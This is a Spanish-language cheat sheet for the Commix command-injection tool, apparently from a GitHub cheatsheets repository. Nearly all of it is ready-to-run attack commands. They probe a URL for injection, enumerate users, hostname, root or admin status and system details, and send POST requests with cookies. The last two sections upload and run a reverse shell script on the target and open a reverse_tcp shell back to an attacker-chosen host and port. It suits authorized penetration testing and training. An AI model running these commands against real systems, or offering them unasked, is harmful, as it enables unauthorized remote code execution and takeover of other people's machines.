# Commix Cheat Sheet

#### Revisar si es vulnerable a inyección de comandos un sitio web
```
commix -u <URL>
```

#### Leer un request y revisar si es vulnerable a inyección de comandos
```
commix -r <REQUEST-FILE>
```

#### Obtener toda la información básica del objetivo
```
commix -u <URL> --all
```

#### Conocer el usuario actual del objetivo
```
commix -u <URL> --current-user
```

#### Conocer el nombre del Host del objetivo
```
commix -u <URL> --hostname
```

#### Saber si el usuario es root o no
```
commix -u <URL> --is-root
```

#### Conocer la información del sistema del objetivo
```
commix -u <URL> --sys-info
```

#### Conocer todos los usuarios del sistema
```
commix -u <URL> --users
```

#### Saber si el usuario es admin o no
```
commix -u <URL> --is-admin
```

#### Enviar la petición por POST y usando una cookie
```
commix -u <URL> --cookie="<COOKIE>" --data="ip=127.0.0.1&Submit=Submit"
```

#### Cargar una reverse shell y ejecutarla
```
commix -u <URL> --cookie="<COOKIE>" --data="ip=127.0.0.1&Submit=Submit" --file-write="/root/revshell.sh" --file-dest="/tmp/revshell.sh" --os-cmd="bash /tmp/revshell.sh"
```

#### Enviar un reverse shell estando dentro del equipo con commix
```
commix(os_shell)> reverse_tcp
commix(os_shell)> set lhost <IP-ADDRESS>
commix(os_shell)> set lport <PORT>
commix(os_shell)> 1
...
commix(os_shell)> 3
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)